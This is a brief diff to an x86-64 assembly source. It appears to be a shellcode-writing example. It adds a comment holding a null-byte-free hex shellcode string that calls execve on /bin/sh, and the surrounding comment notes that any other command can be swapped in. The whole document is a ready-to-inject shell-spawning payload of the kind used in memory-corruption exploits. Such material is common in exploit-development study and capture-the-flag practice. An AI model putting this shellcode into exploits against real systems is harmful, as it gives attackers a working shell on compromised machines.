@@ -14,3 +14,6 @@ _start:
 .data:
     call .text
     db '/bin/sh', 0x00 ; can be any other command of course
+
+; null-byte free shell spawning shellcode from the above snippet:
+; \xeb\x0b\x5f\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
